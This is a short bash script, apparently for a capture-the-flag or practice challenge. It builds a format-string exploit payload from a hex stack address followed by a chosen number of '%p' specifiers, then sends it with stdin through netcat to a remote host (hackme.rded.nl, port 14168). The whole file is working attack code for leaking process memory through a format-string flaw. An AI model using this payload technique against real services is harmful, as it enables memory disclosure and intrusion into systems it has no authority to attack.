#!/bin/bash

attackstr="0x7fffffffeb1f"

if ! [ "$1" = "" ]; then
    for i in $(seq 1 $1); 
    do 
        attackstr="${attackstr}%p "
    done
fi 

(echo $attackstr; cat -) | nc hackme.rded.nl 14168
